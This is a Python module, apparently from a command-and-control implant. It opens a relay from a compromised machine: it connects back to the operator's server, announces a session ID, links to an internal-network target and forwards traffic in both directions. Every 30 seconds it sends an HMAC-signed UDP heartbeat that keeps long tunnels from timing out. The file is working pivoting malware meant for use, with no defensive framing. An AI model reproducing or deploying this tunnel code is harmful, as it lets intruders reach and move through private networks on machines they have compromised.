"""
@module: relay
@desc: 中继通道（13/14）：连 server relay 端口 → HELLO → 连内网目标 → 双向转发
由 server 端 socks5/portfwd 自动下发，操作员无需手动调用。
"""
import socket
import threading

MODULE = {
    "desc": "中继通道（socks5/portfwd 自动下发，双向转发）",
    "params": [("conn_id", "必填；中继会话 ID"),
               ("relay_port", "必填；server relay 端口"),
               ("target", "必填；目标 host:port")],
}

# 长隧道心跳（复制自 exec.py 的 _hb_start/_hb_stop，独立变量名避免与 exec
# 的 _hb_go/_hb_stop_ev 冲突）：中继会话可能超过 client_timeout(300s)，期间
# beacon 不发业务帧，server 清理线程按 last_seen 判离线移除。这里每 30s 发
# UDP 心跳（<bid 16 hex><HMAC(_K,bid)[:8]>）到 server beacon 端口刷新 last_seen
# （server.py _start_udp_heartbeat 验 HMAC 后更新）。
_relay_hb_go = False
_relay_hb_ev = None


def _relay_hb_start():
    global _relay_hb_go, _relay_hb_ev
    if _relay_hb_go:
        return
    try:
        import hmac as _hm
        import hashlib as _hl
        _relay_hb_go = True
        _relay_hb_ev = threading.Event()

        def _beat():
            try:
                u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                u.settimeout(2)
                while not _relay_hb_ev.is_set():
                    try:
                        mac = _hm.new(_K, _D.encode(), _hl.sha256).digest()[:8]
                        u.sendto(_D.encode() + mac, (_H, _P))
                    except OSError:
                        pass
                    _relay_hb_ev.wait(30)
                u.close()
            except Exception:
                pass

        threading.Thread(target=_beat, daemon=True).start()
    except Exception:
        pass


def _relay_hb_stop():
    global _relay_hb_go
    try:
        _relay_hb_ev.set()
    except Exception:
        pass
    _relay_hb_go = False


def run(conn_id, relay_port, target):
    try:
        # _H = beacon 全局（server 地址）；relay 端口由任务参数指定
        r = socket.create_connection((_H, int(relay_port)), timeout=15)
    except Exception as e:
        return f"(relay error: 连 relay 失败 {e})"
    _relay_hb_start()   # 进入中继会话前启动心跳（防长隧道被误判离线）
    try:
        r.sendall(f"HELLO {conn_id}\n".encode())
        th, tp = target.rsplit(":", 1)
        t = socket.create_connection((th, int(tp)), timeout=15)

        def fwd(src, dst):
            try:
                while True:
                    data = src.recv(65536)
                    if not data:
                        break
                    dst.sendall(data)
            except OSError:
                pass
            finally:
                try:
                    dst.shutdown(socket.SHUT_WR)
                except OSError:
                    pass

        threading.Thread(target=fwd, args=(t, r), daemon=True).start()
        fwd(r, t)
        return "(relay closed)"
    except Exception as e:
        return f"(relay error: {e})"
    finally:
        _relay_hb_stop()
        try:
            r.close()
        except OSError:
            pass
